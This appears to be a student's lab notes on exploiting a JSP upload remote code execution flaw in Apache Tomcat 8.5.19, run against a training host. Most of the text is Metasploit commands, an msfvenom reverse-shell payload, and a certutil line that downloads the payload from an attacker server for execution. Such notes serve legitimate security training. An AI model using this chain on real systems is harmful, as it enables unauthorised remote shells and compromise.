#### Exploiting Apache tomcat
- The standard Apache HTTP web server is used to host static and dynamic websites or web applications, typically developed in PHP.
- The Apache Tomcat web server is primarily used to host dynamic websites or web applications developed in Java.
- Apache tomcat v8.5.19 is vulnerable to a remote code execution vulnerability that could potentially allow an attacker to upload and execute a JSP paylaod in order to gain remote access to the target server.
- We can utilize a prebuilt MSF exploit module to exploit this vulnerability and consequently gain access to the target server.
#### lab
- service postgresql start
- msfconsole
- workspace -a tomcat
- setg RHOSTS demo.ine.local
- db_nmap -sS -sV -O demo.ine.local
- services [ this show all the available services ]
- search type:exploit tomcat_jsp
- use exploit/multi/http/tomcat_jsp_upload_bypass
- set everything requires 
- set PAYLOAD java/jsp_shell_bind_tcp
- set SHELL cmd [ executing command ]
- run [this will create a cmd shell]
- ctrl + z [ background the sessions ]
- move into new tab 
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.4 LPORT=1234 -f exe > meterpreter.exe [ creating a meterpreter paylaod ]
- sudo python -m SimpleHTTPServer 80 [create a server]
- move to the windows sessions
- certutil -urlcache -f http://10.10.10.12/meterpreter.exe meterpeter.exe [ download the meterpreter file and save it as meterpreter from the attacker created server to windows sessions ]
- use multi/handler module to get meterpreter shell
- .\meterpreter.exe [ execute this command in windows sessions ]
- this give a meterpreter shell where multi/handler is set previously
  
